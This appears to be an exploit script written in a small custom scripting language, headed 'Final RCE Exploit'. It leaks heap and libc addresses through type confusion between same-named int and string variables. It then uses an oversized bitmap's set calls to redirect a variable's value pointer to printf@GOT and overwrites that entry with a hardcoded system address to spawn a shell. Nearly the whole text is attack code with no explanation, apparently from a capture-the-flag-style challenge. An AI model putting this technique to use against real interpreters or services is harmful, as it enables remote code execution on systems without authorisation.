print("=== Final RCE Exploit ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;
print("addr1:");
print(addr1);

int leak2 = 0;
string leak2 = "second";
int addr2 = leak2;
print("addr2:");
print(addr2);

int leak3 = 0;
string leak3 = "third";
int addr3 = leak3;
print("addr3:");
print(addr3);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 3: Calculate system");
print("system_addr = 139879858407248");
print("printf@GOT = 0x409048");

print("Step 4: Create target variable");
string target = "target";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 5: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 6: Calculate addresses");
int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
print("entryaddr:");
print(entryaddr);
print("valueptraddr:");
print(valueptraddr);

print("Step 7: Try bitmap buffer = addr1 - 0x1000");
int bitmapptr = addr1 - 4096;
int offset = valueptraddr - bitmapptr;
int bitindex = offset * 8;
print("bitmapptr:");
print(bitmapptr);
print("offset:");
print(offset);
print("bit_index:");
print(bitindex);

print("Step 8: Write printf@GOT to value_ptr");
print("Writing 64 bits...");
set(b1, 29376, 0, 0);
set(b1, 29377, 0, 0);
set(b1, 29378, 0, 0);
set(b1, 29379, 0, 1);
set(b1, 29380, 0, 0);
set(b1, 29381, 0, 0);
set(b1, 29382, 0, 1);
set(b1, 29383, 0, 0);
set(b1, 29384, 0, 0);
set(b1, 29385, 0, 0);
set(b1, 29386, 0, 0);
set(b1, 29387, 0, 0);
set(b1, 29388, 0, 1);
set(b1, 29389, 0, 0);
set(b1, 29390, 0, 0);
set(b1, 29391, 0, 1);
set(b1, 29392, 0, 0);
set(b1, 29393, 0, 0);
set(b1, 29394, 0, 0);
set(b1, 29395, 0, 0);
set(b1, 29396, 0, 0);
set(b1, 29397, 0, 0);
set(b1, 29398, 0, 1);
set(b1, 29399, 0, 0);
set(b1, 29400, 0, 0);
set(b1, 29401, 0, 0);
set(b1, 29402, 0, 0);
set(b1, 29403, 0, 0);
set(b1, 29404, 0, 0);
set(b1, 29405, 0, 0);
set(b1, 29406, 0, 0);
set(b1, 29407, 0, 0);
set(b1, 29408, 0, 0);
set(b1, 29409, 0, 0);
set(b1, 29410, 0, 0);
set(b1, 29411, 0, 0);
set(b1, 29412, 0, 0);
set(b1, 29413, 0, 0);
set(b1, 29414, 0, 0);
set(b1, 29415, 0, 0);
set(b1, 29416, 0, 0);
set(b1, 29417, 0, 0);
set(b1, 29418, 0, 0);
set(b1, 29419, 0, 0);
set(b1, 29420, 0, 0);
set(b1, 29421, 0, 0);
set(b1, 29422, 0, 0);
set(b1, 29423, 0, 0);
set(b1, 29424, 0, 0);
set(b1, 29425, 0, 0);
set(b1, 29426, 0, 0);
set(b1, 29427, 0, 0);
set(b1, 29428, 0, 0);
set(b1, 29429, 0, 0);
set(b1, 29430, 0, 0);
set(b1, 29431, 0, 0);
set(b1, 29432, 0, 0);
set(b1, 29433, 0, 0);
set(b1, 29434, 0, 0);
set(b1, 29435, 0, 0);
set(b1, 29436, 0, 0);
set(b1, 29437, 0, 0);
set(b1, 29438, 0, 0);
set(b1, 29439, 0, 0);

print("Write completed");

print("Step 9: Verify corruption");
print("target.value_ptr should now point to printf@GOT");
int verify = target;
print("Reading target (should be printf address from libc):");
print(verify);

print("Step 10: Write system_addr to GOT");
print("target = system_addr");
print("This writes system_addr to printf@GOT");
int systemaddr = 139879858407248;
target = systemaddr;

print("Step 11: Trigger shell");
print("print with /bin/sh");
print("This should call system and give shell");

